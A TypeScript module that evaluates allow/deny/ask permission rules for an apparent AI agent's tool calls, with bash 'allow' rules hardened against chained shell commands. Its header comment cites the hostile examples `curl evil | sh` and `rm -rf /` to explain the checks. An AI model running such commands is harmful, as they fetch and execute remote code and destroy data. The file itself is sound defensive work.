/**
 * Config-based permission rule evaluator for headless/CI mode.
 *
 * Rules are defined in ~/.config/kimiflare/config.json as:
 * {
 *   "permissions": {
 *     "bash": { "**\/test\/\*\*": "allow", "**": "ask" },
 *     "write": { "**": "deny" },
 *     "edit": { "~/trusted/**": "allow", "**": "ask" }
 *   }
 * }
 *
 * Evaluation order:
 * 1. Match the most specific pattern first.
 * 2. If no rule matches, return "ask" (fallback to interactive behavior).
 * 3. In headless mode, "ask" becomes "deny" unless --dangerously-allow-all is set.
 *
 * A pattern matches a target that starts with it, or that matches it as a
 * glob. For bash commands an "allow" rule is stricter, because a command
 * that starts with an allowed one can run anything after it
 * (`npm test; curl evil | sh`):
 * - a prefix match must end at a word boundary (`npm test` allows
 *   `npm test -- --watch`, not `npm testify`), and the rest of the command
 *   may contain no shell control syntax (; & | ` $( ${ < > newline or
 *   other control characters);
 * - a glob match applies only when every control token in the command
 *   also appears in the pattern;
 * - a pattern of only wildcards (`**`, `*`) still allows every command.
 * An allow rule that does not apply falls through to the next rule.
 * "deny" and "ask" rules match bash commands as before, and also match
 * each command in a compound command (`cd x && rm -rf /` matches `rm -rf`).
 */

import { resolve, relative } from "node:path";
import { homedir } from "node:os";
import type { PermissionRule, PermissionRules } from "./config.js";

export interface PermissionEvalRequest {
  tool: string;
  args: Record<string, unknown>;
  cwd: string;
}

/**
 * Evaluate permission rules for a tool call.
 * Returns the decision: "allow", "deny", or "ask".
 */
export function evaluatePermissionRules(
  req: PermissionEvalRequest,
  rules: Record<string, PermissionRules>,
): PermissionRule {
  const toolRules = rules[req.tool];
  if (!toolRules) return "ask";

  // Extract the target path or command from args
  const target = extractTarget(req.tool, req.args, req.cwd);
  if (!target) return "ask";

  // Find matching rules, sorted by specificity (longest pattern first)
  const entries = Object.entries(toolRules).sort((a, b) => b[0].length - a[0].length);

  for (const [pattern, rule] of entries) {
    const matched =
      req.tool !== "bash"
        ? matchPattern(target, pattern, req.cwd)
        : rule === "allow"
          ? matchBashAllow(target, pattern, req.cwd)
          : matchBashRestrict(target, pattern, req.cwd);
    if (matched) {
      return rule;
    }
  }

  return "ask";
}

function expandHome(path: string): string {
  if (path.startsWith("~/")) {
    return resolve(homedir(), path.slice(2));
  }
  return path;
}

function extractTarget(tool: string, args: Record<string, unknown>, cwd: string): string | null {
  switch (tool) {
    case "write":
    case "edit":
    case "read":
    case "glob":
    case "grep":
      return typeof args.path === "string" ? resolve(cwd, expandHome(args.path)) : null;
    case "bash":
      return typeof args.command === "string" ? args.command : null;
    case "browser_fetch":
    case "web_fetch":
      return typeof args.url === "string" ? args.url : null;
    case "search_web":
      return typeof args.query === "string" ? args.query : null;
    default:
      // For unknown tools, try common arg names
      return (
        (typeof args.path === "string" ? resolve(cwd, expandHome(args.path)) : null) ??
        (typeof args.url === "string" ? args.url : null) ??
        (typeof args.command === "string" ? args.command : null)
      );
  }
}

function matchPattern(target: string, pattern: string, cwd: string): boolean {
  // Expand home directory
  let expandedPattern = pattern;
  if (pattern.startsWith("~/")) {
    expandedPattern = resolve(homedir(), pattern.slice(2));
  }

  // Absolute path match
  if (target.startsWith(expandedPattern)) {
    return true;
  }

  return matchGlob(target, pattern, cwd);
}

function matchGlob(target: string, pattern: string, cwd: string): boolean {
  const expandedPattern = pattern.startsWith("~/") ? resolve(homedir(), pattern.slice(2)) : pattern;

  // Glob-style matching using simple rules
  const regex = globToRegex(expandedPattern);
  if (regex.test(target)) {
    return true;
  }

  // Try relative to cwd
  try {
    const relTarget = relative(cwd, target);
    if (regex.test(relTarget)) {
      return true;
    }
  } catch {
    // ignore
  }

  return false;
}

/** Shell syntax that can run another command, redirect, or substitute. */
const CONTROL_TOKENS = [";", "&", "|", "`", "$(", "${", "<", ">", "\n", "\r"];
// Control characters other than tab (newline and CR are listed above).
// eslint-disable-next-line no-control-regex
const OTHER_CONTROL_CHARS = /[\x00-\x08\x0b-\x0c\x0e-\x1f\x7f]/;

function hasControlSyntax(text: string): boolean {
  return OTHER_CONTROL_CHARS.test(text) || CONTROL_TOKENS.some((t) => text.includes(t));
}

/** Control syntax in `command` that `pattern` does not itself contain. */
function hasControlSyntaxBeyond(command: string, pattern: string): boolean {
  if (OTHER_CONTROL_CHARS.test(command) && !OTHER_CONTROL_CHARS.test(pattern)) return true;
  return CONTROL_TOKENS.some((t) => command.includes(t) && !pattern.includes(t));
}

function isWildcardOnly(pattern: string): boolean {
  return /^[*\s]+$/.test(pattern);
}

/**
 * An "allow" rule for a bash command. Matches the same commands as
 * matchPattern except that a prefix match must end at a word boundary and
 * leave no shell control syntax in the rest of the command, and a glob
 * match must not let in control syntax the pattern does not contain.
 */
function matchBashAllow(command: string, pattern: string, cwd: string): boolean {
  if (isWildcardOnly(pattern)) return true;
  const prefix = pattern.startsWith("~/") ? resolve(homedir(), pattern.slice(2)) : pattern;
  if (command.startsWith(prefix)) {
    const rest = command.slice(prefix.length);
    const boundary = rest === "" || /\s/.test(rest[0]!) || !/\w$/.test(prefix);
    // `$` at the end of the pattern plus `(` / `{` after it is `$(` / `${`.
    const splitsToken = prefix.endsWith("$") && /^[({]/.test(rest);
    if (boundary && !splitsToken && !hasControlSyntax(rest)) return true;
  }
  if (hasControlSyntaxBeyond(command, pattern)) return false;
  return matchGlob(command, pattern, cwd);
}

/**
 * A "deny" or "ask" rule for a bash command: everything matchPattern
 * matches, plus any single command inside a compound one.
 */
function matchBashRestrict(command: string, pattern: string, cwd: string): boolean {
  if (matchPattern(command, pattern, cwd)) return true;
  const segments = command
    .split(/;|&|\||`|\$\(|\(|\)|\{|\}|\n|\r/)
    .map((seg) => seg.trim())
    .filter((seg) => seg && seg !== command);
  return segments.some((seg) => matchPattern(seg, pattern, cwd));
}

function globToRegex(pattern: string): RegExp {
  // Simple glob to regex conversion
  let regex = pattern
    .replace(/\*\*/g, "<<<DOUBLESTAR>>>")
    .replace(/\*/g, "[^/]*")
    .replace(/<<<DOUBLESTAR>>>/g, ".*")
    .replace(/\?/g, ".");

  // If pattern doesn't start with / or ., make it match anywhere
  if (!regex.startsWith("/") && !regex.startsWith(".*")) {
    regex = ".*/" + regex;
  }

  return new RegExp(`^${regex}$`);
}
